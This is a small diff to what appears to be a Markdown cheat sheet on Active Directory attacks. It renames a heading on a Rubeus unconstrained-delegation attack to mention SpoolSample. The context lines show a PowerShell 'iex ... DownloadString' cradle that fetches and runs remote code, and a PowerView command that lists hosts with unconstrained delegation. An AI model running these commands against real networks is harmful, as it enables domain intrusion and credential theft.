@@ -796,7 +796,7 @@ iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com
 
 * * *
 
-#### Rubeus Unconstrained Delegation Attack Flow
+#### Rubeus Unconstrained Delegation Attack Flow with SpoolSample
 ```Get-NetComputer -UnConstrained```
 
 ```
